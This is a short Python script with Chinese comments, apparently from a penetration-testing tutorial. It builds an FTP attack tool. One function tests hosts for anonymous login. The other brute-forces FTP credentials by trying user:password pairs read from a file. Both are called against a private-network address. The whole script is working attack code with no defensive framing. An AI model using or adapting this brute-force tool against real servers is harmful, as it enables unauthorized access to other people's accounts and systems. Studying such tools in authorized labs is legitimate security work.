"""
构建匿名FTP扫描器。
"""

import ftplib

# 匿名访问，查找可以匿名访问的ftp服务器
def anonLogin(hostname):
    try:
        ftp = ftplib.FTP(hostname)
        # 匿名登陆 如果登陆不成功则报错
        ftp.login('anonymous', 'me@your.com')
        print('\n[*] ' + str(hostname) + 'FTP Anonymous Login Successed.')
        ftp.quit()
        return True
    except Exception as e:
        print('\n[-] ' + str(hostname) + 'FTP Anonymous Login Failed.')
        return False

host = '192.168.1.101'
anonLogin(host)

# 文本遍历，破解ftp的用户和密码
def bruteLogin(hostname, passwordFile):
    pF = open(passwordFile, 'r')
    for line in pF.readlines():
        split_str = line.split(':')
        userName = split_str[0]
        password = split_str[1].strip('\r').strip('\n')
        print('[+] Trying: ' + userName + '/' + password)
        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(userName, password)
            print('\n[*] ' + str(hostname) + ' FTP Login Successed: ' + userName + '/' + password)
            ftp.quit()
            return (userName, password)
        except Exception as e:
            pass
    print('\n[-] Could not brute force FTP credentials.')
    return (None, None)


host = '192.168.1.101'
passwdFile = 'userpass.txt'
bruteLogin(host, passwdFile)